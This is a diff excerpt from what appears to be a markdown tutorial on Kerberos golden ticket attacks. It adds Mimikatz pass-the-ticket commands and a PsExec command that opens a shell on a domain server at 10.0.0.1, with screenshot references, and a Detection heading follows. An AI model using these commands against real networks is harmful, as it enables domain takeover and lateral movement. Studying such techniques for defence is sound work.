@@ -78,6 +78,19 @@ sudo python3 ticketConverter.py admin.ccache ticket.kirbi
 <img src="/img/golden/convert.PNG" alt="Getting-gz" width="800" height="150"> 
 
  whenever you want to access the Domain server service you can use the ticket.kirbi file
+```
+kerberos::ptt ticket.kirbi
+misc::cmd
+```
+
+<img src="/img/golden/connect1.PNG" alt="Getting-gz" width="800" height="150"> 
+
+access the service.
+```
+PsExec64.exe \\10.0.0.1 cmd.exe
+```
+
+<img src="/img/golden/hh.PNG" alt="Getting-gz" width="800" height="150"> 
 
 ## golden ticket with Rubeus.exe
 ## Detection
